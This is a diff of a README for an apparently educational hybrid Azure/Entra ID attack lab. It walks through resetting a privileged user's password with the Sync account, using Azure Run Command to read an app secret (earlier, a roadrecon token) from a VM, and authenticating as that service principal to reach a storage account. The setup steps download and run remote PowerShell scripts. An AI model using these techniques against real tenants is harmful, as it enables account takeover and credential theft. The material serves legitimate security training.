@@ -5,20 +5,13 @@
 
 1. RDP login to DC VM using the YOURDOMAIN\\**rootuser**, then run the following script as admin (**when asked, login using the ENTRA CREDS (!) - you will be asked twice**)
     ```powershell
-    # when asked, login using the ENTRA ADMIN CREDS (!)
-    $tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView
+    # when asked, login using the ENTRA ADMIN CREDS (!) - you will be asked twice
     Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/refs/heads/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-4-full-attack-flow/lab4PreparationScript.ps1" -OutFile "C:\\lab4PreparationScript.ps1"; `
-    & "C:\\lab4PreparationScript.ps1" -TenantID $tenantId
+    & "C:\\lab4PreparationScript.ps1" -DomainName #"mydomain.onmicrosoft.com"
     ```
-    - Ignore errors such as "*cannot be created because function capacity 4096 has been exceeded for this scope*"..
     - if failed it's probably due to timeout: rerun again and enter the creds faster
 
-2. RDP login to Win11 VM using the YOURDOMAIN\\**user1**, then run the following script as admin:
-    ```powershell
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/shackcrack007/hybrid-attacks-course-template/refs/heads/main/labs%20(for%20course%20sessions%2C%20not%20part%20of%20setup)/lab-4-full-attack-flow/lab4Win11VmPrepScript.ps1" -OutFile "C:\\lab4Win11VmPrepScript.ps1"; `
-        & "C:\\lab4Win11VmPrepScript.ps1"
-    ```
-    keep this window open in the background - **you're not allowed to use it from now on**
+2. RDP login to Win11 VM, then put there what you've created in the script above in the correct place..
 
 ## Instructions: Start Here
 1. Your goal is to find the `secret.txt` file 
@@ -41,17 +34,16 @@ Do not use hints unless you really have to..
     <summary><b>Entire attack path hint (use as last resort)</b></summary>
 
 ![entire_path](entire_path.png)
-    1. Pass reset: DC vm -> reset pass of "user2" using Entra Sync credentials
+    1. Pass reset: DC vm -> reset pass of "user2" (or your given user in the class) using Entra Sync account credentials
 
     2. Login to Azure as that user using your browser
 
-    3. Azure Portal Run Command on Win11 VM (the VM that has user1 logged on)
+    3. Azure Portal Run Command on Win11 VM 
 
-    4. Steal user1 PRT Cookie by running powershell script from the Run Command extension on the Azure portal 
+    4. Steal the app secret on that VM by running powershell script from the Run Command extension on the Azure portal 
 
-    5. Use PRT Cookie to get access token and authenticate using PowerShell to MS Graph API read secret.txt from storage account
+    5. Use the secret to get access token and authenticate using PowerShell to MS Graph API read secret.txt from storage account
 </details>
-
 
 
 ## Step 1
@@ -91,7 +83,7 @@ Login using dumped Sync_XX account:
 $at = Get-AADIntAccessTokenForAADGraph
 $tenant = Get-AADIntSyncConfiguration -AccessToken $at # get the tenant ID
 
-Connect-AzureAD -AadAccessToken $at -TenantId $tenant.TenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id
+Connect-AzureAD -AadAccessToken $at -tenantId $tenant.tenantId -AccountId "1b730954-1685-4b74-9bfd-dac224a7b894" # "Azure Active Directory PowerShell" app id
 ```
 
 Enumerate users:
@@ -109,7 +101,93 @@ $onpremSyncedUsers | ForEach-Object {
 } | Format-Table -Wrap -AutoSize
 
 ```
-Target user2, as he holds a privileged role.. 
+
+Enumerate Applications:
+```powershell
+# Retrieve all applications
+$applications = Get-MgApplication -All
+
+# Retrieve all service principals (needed for permission lookup)
+$servicePrincipals = Get-MgServicePrincipal -All
+
+# Iterate over each application
+foreach ($app in $applications) {
+    $appName = $app.DisplayName
+    $appId = $app.AppId
+    $appObjectId = $app.Id
+
+    # Retrieve permissions (RequiredResourceAccess contains GUIDs of permissions)
+    $permissions = @()
+    foreach ($resourceAccess in $app.RequiredResourceAccess) {
+        $sp = $servicePrincipals | Where-Object { $_.AppId -eq $resourceAccess.ResourceAppId }
+        if ($sp) {
+            foreach ($perm in $resourceAccess.ResourceAccess) {
+                $role = $sp.AppRoles | Where-Object { $_.Id -eq $perm.Id }
+                $permName = if ($role) { $role.DisplayName } else { "Unknown Permission ($($perm.Id))" }
+                $permissions += [PSCustomObject]@{
+                    ResourceName = $sp.DisplayName
+                    Permission   = $permName
+                    Type         = $perm.Type
+                }
+            }
+        }
+    }
+
+    # Output application information
+    Write-Host "Application: $appName"
+    Write-Host "  App ID: $appId"
+    Write-Host "  Object ID: $appObjectId"
+    Write-Host "  Required Permissions:"
+    $permissions | Format-Table -AutoSize
+
+    # Retrieve associated service principal
+    $sp = $servicePrincipals | Where-Object { $_.AppId -eq $appId }
+    if ($sp) {
+        $spName = $sp.DisplayName
+        $spObjectId = $sp.Id
+        Write-Host "  Service Principal: $spName"
+        Write-Host "    Object ID: $spObjectId"
+
+        # Get assigned roles for the service principal
+        $assignedRoles = Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $spObjectId
+        if ($assignedRoles) {
+            $roleDetails = @()
+            foreach ($role in $assignedRoles) {
+                $resourceSP = $servicePrincipals | Where-Object { $_.Id -eq $role.ResourceId }
+                if ($resourceSP) {
+                    $roleName = $resourceSP.AppRoles | Where-Object { $_.Id -eq $role.AppRoleId }
+                    $roleDisplayName = if ($roleName) { $roleName.DisplayName } else { "Unknown Role ($($role.AppRoleId))" }
+                    $roleDetails += [PSCustomObject]@{
+                        AssignedTo    = $resourceSP.DisplayName
+                        RoleName      = $roleDisplayName
+                    }
+                }
+            }
+
+            Write-Host "    Assigned Roles:"
+            $roleDetails | Format-Table -AutoSize
+        } else {
+            Write-Host "    No assigned roles."
+        }
+    } else {
+        Write-Host "  No associated service principal found."
+    }
+
+    Write-Host "--------------------------------------"
+}
+```
+
+We see some interesting app and service principal, however we don't have any permissions to them..
+</details>
+
+## Step 2
+
+<details>
+    <summary><b>Hint 1</b></summary>
+    
+    Let's target `user2` (or your target user given as in class), as he holds a privileged role and we do have permissions to set its password.. 
+</details>
+
 
 Reset the victim user's Entra password:
 ```powershell
@@ -118,7 +196,7 @@ Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS"  -AccessT
 </details>
 
 
-## Step 2
+## Step 3
 
 <details>
     <summary><b>Hint 1</b></summary>
@@ -136,63 +214,47 @@ Set-AADIntUserPassword -SourceAnchor "IMMUTABLE_ID" -Password "MYPASS"  -AccessT
 <details>
     <summary><b>Hint 3</b></summary>
     
-    Use this ability to get a PRT Cookie so you can impersonate as that user and steal its identity and permissions
+    user1 is logged into that Win 11 vm, and he's a part of the company's IT, he's the guy responsible for backing up cloud data of the company.
+    He does that by running stuff from the C:\ folder...
 </details>
 
 <details>
     <summary><b>Hint 4</b></summary>
 
-    user1 is logged into that Win 11 vm, and he's a part of the company's red team, he continuously, on a regular basis, runs scripts from his Desktop folder to map their Entra tenant's attack surface. Use that to your advantage.
+    Use the Run Command extension to get a secret that lies on this machine on the C:\ folder..
 </details>
 
 <details>
 <summary><b>Solution</b></summary>
 
-user1 uses roadrecon to map attack surfaces in his company's attack surface, the script is executed on a regular basis.
-As we learned, roadrecon writes a file with the access token called `.roadtools_auth`, we can take that access token and steal it!
+user1 created an app with a scret to make these backups, let's use that for our advantage..
 
-1. Login to portal.azure.com as user2
+1. Login to portal.azure.com as the target user you compromised
 2. Run the following command on the Win11 VM from the Run Command Window in the Azure portal:
-3. `type c:\users\user1\desktop\.roadtools_auth`
-
-
-If the file is empty, then make sure `user1` is logged in properly:
-1. RDP and login to the Win11 VM using the user `user1@YOURDOMAIN.onmicrosoft.com`
-2. run `dsregcmd /status` and make sure you don't have "invalid".. fields, and that you see `AzureAdPrt : YES`
-   ![prt](prtexists.png)
-3. Make sure you are verified:
-   1. open Edge and make sure you have your profile logged in
-   2. go to Start -> Account Info and make sure you don't have any warning about not being verified, if you have then verify yourself.
-      ![verify](verifyAccount.png)
-4. if there's still an issue, restart the vm and login again
-5. if it's still empty, rerun the task scheduler ![runTask](runTask.png)
+3. `type c:\backup_app_secret.txt`
 </details>
 
 ## Step 3
 <details>
     <summary><b>Hint 1</b></summary>
     
-    Using the acquired access token, what can you do?
-    You may use your own PC / DC VM
+    Using the acquired file content, what can you do?
+    You may use your own PC / DC VM, you got everything you needed from this VM.
 </details>
 
 <details>
     <summary><b>Hint 2</b></summary>
     
-    Recon as that user and see what he has access to..
+    Authenticate as that SPN and see what it has access to..
 
 ```powershell
-$at = "eyJ"... # what you've obtained from the Run Command hack
-$userUPN = "user1@YOURDOMAIN.onmicrosoft.com" # you can get it from the access token if you'll parse in https://jwt.io
-$tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView
+$appSecret = "SECRET_FROM_VM"
+$tenantId = "YOUR_TENANT_ID"
+$spId = "SPN_OBJECT_ID"
 
-
-Connect-AzureAD -AccountId  $userUPN -TenantId $tenantId -AadAccessToken $at
-Connect-AzAccount -AccountId  $userUPN -TenantId $tenantId -AccessToken $at 
-
-# If it doesn't work, verify the access token— if it has expired, renew it by:
-$refreshToken = <the refresh token from the `roadtools_auth` file>
-$at=Get-AADIntAccessTokenWithRefreshToken -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894" -Resource "https://graph.windows.net" -TenantId $tenantId -RefreshToken $refreshToken
+$SecureClientSecret = ConvertTo-SecureString $appSecret -AsPlainText -Force
+$Credential = New-Object System.Management.Automation.PSCredential ($appId, $SecureClientSecret)
+Connect-AzAccount -ServicePrincipal -Credential $Credential -tenantId $tenantId
 ```
 </details>
 
@@ -200,10 +262,8 @@ $at=Get-AADIntAccessTokenWithRefreshToken -ClientId "1b730954-1685-4b74-9bfd-dac
     <summary><b>Hint 3</b></summary>
     
 ```powershell
-# List current user's Azure Role Assignments using Azure PowerShell
-
-$userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
-$roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
+# List SPN's Azure Role Assignment using Azure PowerShell
+$roleAssignments = Get-AzRoleAssignment -ObjectId $spId
 $roleAssignments | ForEach-Object {
     Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
 }
@@ -213,7 +273,7 @@ $roleAssignments | ForEach-Object {
 <details>
     <summary><b>Hint 4</b></summary>
     
-    We can see that there's a storage account that this user has access to..
+    We can see that there's a storage account that this SPN has access to..
 </details>
 
 
@@ -221,25 +281,15 @@ $roleAssignments | ForEach-Object {
     <summary><b>Solution</b></summary>
     
 ```powershell
-# Recon as that user and see what he has access to..
-$at = "eyJ"... # what you've obtained from the Run Command hack
-$userUPN = "user1@YOURDOMAIN.onmicrosoft.com" # you can get it from the access token if you'll parse in https://jwt.io
-$tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView
+Get-MgApplication -All # select the correct app.appId (NOT app.Id), run this command as the user you've compromised
+$appId = "APP_ID" # get it from command above
+$appSecret = "SECRET_FROM_VM"
+$tenantId = "YOUR_TENANT_ID" # you can get it here https://entra.microsoft.com/#view/Microsoft_AAD_IAM/TenantOverview.ReactView$spId = "SPN_OBJECT_ID"
 
+$SecureClientSecret = ConvertTo-SecureString $appSecret -AsPlainText -Force
+$Credential = New-Object System.Management.Automation.PSCredential ($appId, $SecureClientSecret)
+Connect-AzAccount -ServicePrincipal -Credential $Credential -tenantId $tenantId
 
-Connect-AzureAD -AccountId $userUPN -TenantId $tenantId -AadAccessToken $at
-Connect-AzAccount -AccountId $userUPN -TenantId $tenantId -AccessToken $at 
-
-# If it doesn't work, verify the access token— if it has expired, renew it by:
-$refreshToken = <the refresh token from the `roadtools_auth` file>
-$at=Get-AADIntAccessTokenWithRefreshToken -ClientId "1b730954-1685-4b74-9bfd-dac224a7b894" -Resource "https://graph.windows.net" -TenantId $tenantId -RefreshToken $refreshToken
-
-# List current user's Azure Role Assignments using Azure PowerShell
-$userObjectId = "686ebf9d-25..." # get it by parsing the JWT token and looking for the 'oid' field
-$roleAssignments = Get-AzRoleAssignment -ObjectId $userObjectId
-$roleAssignments | ForEach-Object {
-    Write-Output "Role: $($_.RoleDefinitionName) - Scope: $($_.Scope)"
-}
 ```
 We can see that there's a storage account that this user has access to..
 ```powershell
@@ -279,7 +329,7 @@ foreach ($storageAccount in $storageAccounts) {
 ### The content of "secret.txt" in storage account is your medal, mazal tov hacker cracker!
 
 #### Bonus: 
-Go back to the beginning, and try steal user2 identity using silver ticket (Seamless SSO) instead of password reset
+Go back to the beginning, and try steal your target user identity using silver ticket (Seamless SSO) instead of password reset
 </details>
 
 
